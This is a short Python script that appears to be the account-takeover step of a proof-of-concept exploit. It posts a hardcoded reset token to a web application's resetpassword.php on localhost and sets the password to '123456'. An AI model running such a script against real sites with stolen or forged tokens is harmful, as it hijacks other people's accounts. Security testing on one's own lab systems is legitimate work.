import requests

def change_password(target, token, new_password):
    url = f'http://{target}/resetpassword.php'
    data = {
        'token': token,
        'password1': new_password,
        'password2': new_password
    }

    response = requests.post(url, data=data)
    if 'Password changed!' in response.text:
        print('[+] Password changed successfully!')
        return True
    else:
        print('[-] Failed to change password.')
        return False

target = 'localhost:8000'
token = 'ZZwXf0k6znrvMTKWv1JcyTFEa9E_8a1w'
new_password = '123456'

change_password(target, token, new_password)